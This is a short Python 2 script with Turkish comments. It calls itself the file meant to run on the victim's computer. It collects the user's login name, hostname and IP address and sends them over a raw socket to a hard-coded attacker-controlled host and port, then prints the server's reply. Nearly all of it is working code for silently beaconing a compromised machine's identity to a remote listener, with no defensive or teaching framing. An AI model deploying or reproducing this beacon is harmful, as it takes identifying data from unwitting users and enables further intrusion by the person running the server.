#Baslangic2345
# -*- coding: utf-8 -*- 
print("""
	Burasıda kurbanın bilgisayarında çalışacak dosya


	""")
import getpass
kullaniciAdi = getpass.getuser()

import socket
bilgisayarAdi = socket.gethostname()
bilgisayarIpAdresi = socket.gethostbyname(socket.gethostname())

# from time import gmtime, strftime
# strftime("%Y-%m-%d %H:%M:%S", gmtime())


sunucuyaGonderilecekMesaj = (("""

Bağlanan kullanıcı adı: {}

Bağlanan bilgisayar : {}

Bağlanan ip : {}

""").format(kullaniciAdi,bilgisayarAdi,bilgisayarIpAdresi))

import socket  
istemciSoketi = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
host = "192.168.1.23" 
port = 23455
Buffer_Boyutu = 1024
istemciSoketi.connect((host, port)) 
print "Gonderilecek veri: ", sunucuyaGonderilecekMesaj
istemciSoketi.send(sunucuyaGonderilecekMesaj)
print "Veri sunucuya basarili bir sekilde gonderildi."
sunucudanGelenMesaj = istemciSoketi.recv(Buffer_Boyutu)
print "Sunucudan Gelen Mesaj: ", sunucudanGelenMesaj

istemciSoketi.close()

# Sonuc